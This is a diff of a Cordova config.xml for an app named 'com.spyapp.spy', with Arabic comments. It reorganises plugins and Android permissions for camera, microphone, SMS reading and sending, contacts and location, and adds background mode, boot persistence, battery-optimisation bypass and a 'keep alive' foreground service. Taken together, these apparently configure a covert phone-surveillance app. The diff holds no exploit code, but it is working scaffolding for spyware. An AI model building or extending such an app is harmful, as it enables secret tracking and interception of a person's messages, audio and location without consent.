@@ -1,4 +1,3 @@
-
 <?xml version='1.0' encoding='utf-8'?>
 <widget id="com.spyapp.spy" version="1.0.1"
     xmlns="http://www.w3.org/ns/widgets"
@@ -15,53 +14,84 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
+    <!-- تفضيلات أساسية -->
+    <preference name="android-minSdkVersion" value="23" />
     <preference name="android-targetSdkVersion" value="34" />
+    <preference name="AndroidXEnabled" value="true" />
+    <!-- قناة إشعار افتراضية (لبعض بلجنات foreground) -->
+    <preference name="AndroidNotificationChannelId" value="bg_channel" />
+    <preference name="AndroidNotificationChannelName" value="Background Service" />
+    <preference name="AndroidNotificationChannelDesc" value="Keeps the service alive" />
 
     <!-- الإضافات (Plugins) -->
-    <plugin name="cordova-plugin-camera" />
-    <plugin name="cordova-plugin-sms" />
-    <plugin name="cordova-plugin-media-capture" />
-    <plugin name="cordova-plugin-contacts" />
-    <plugin name="cordova-plugin-file" />
-    <plugin name="cordova-plugin-file-transfer" />
+    <plugin name="cordova-plugin-device" />
     <plugin name="cordova-plugin-geolocation" />
-    <plugin name="cordova-plugin-android-permissions" />
     <plugin name="cordova-plugin-media" />
+    <plugin name="cordova-plugin-media-capture" />
+    <plugin name="cordova-plugin-camera" />
+    <plugin name="cordova-plugin-file" />
+    <!-- استبدل contacts القديمة بـ contacts-x -->
+    <plugin name="cordova-plugin-contacts-x" />
+    <!-- إختر واحد فقط لقراءة/إرسال SMS (مع معرفة القيود) -->
+    <plugin name="cordova-plugin-sms" />
+    <!-- أو: <plugin name="cordova-sms-plugin" /> -->
+    <plugin name="cordova-plugin-android-permissions" />
     <plugin name="cordova-plugin-background-mode" />
+    <!-- احذف file-transfer لأنه deprecated -->
+    <!-- <plugin name="cordova-plugin-file-transfer" /> -->
 
     <platform name="android">
+        <!-- ملاحظات: Android 10+ قد يحتاج ACCESS_BACKGROUND_LOCATION لتتبع بالخلفية -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+                <!-- الشبكة -->
+                <uses-permission android:name="android.permission.INTERNET" />
 
-                <!-- أذونات التخزين -->
-                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+                <!-- الإشعارات (Android 13+) لعرض إشعار Foreground Service -->
+                <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
                 <!-- الموقع -->
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+                <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+                <!-- (اختياري) مطلوب فعليًا لو تجمع الموقع وأنت بالخلفية -->
+                <!-- <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" /> -->
 
                 <!-- الكاميرا والمايك -->
                 <uses-permission android:name="android.permission.CAMERA" />
                 <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
-                <!-- الرسائل -->
+                <!-- التخزين (استخدمه فقط إن تحتاجه فعلاً؛ يُفضَّل التخزين الخاص بالتطبيق) -->
+                <!--
+                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+                -->
+
+                <!-- الرسائل (قيود شديدة على Play Store) -->
                 <uses-permission android:name="android.permission.READ_SMS" />
                 <uses-permission android:name="android.permission.RECEIVE_SMS" />
                 <uses-permission android:name="android.permission.SEND_SMS" />
 
-                <!-- الشبكة -->
-                <uses-permission android:name="android.permission.INTERNET" />
-
-                <!-- الخدمات الأمامية والخلفية -->
+                <!-- الإقلاع والتشغيل بالخلفية -->
+                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+                <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-
-                <!-- إذن تجاهل تحسينات البطارية لتشغيل بالخلفية -->
-                <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
             </manifest>
         </edit-config>
+
+        <!-- يمكنك إضافة مستقبل إقلاع (لو عندك بلجن/كود يستمع للـ BOOT_COMPLETED) مع android:exported حسب المتطلبات -->
+        <!--
+        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
+            <application>
+                <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.BOOT_COMPLETED" />
+                    </intent-filter>
+                </receiver>
+            </application>
+        </edit-config>
+        -->
     </platform>
 </widget>
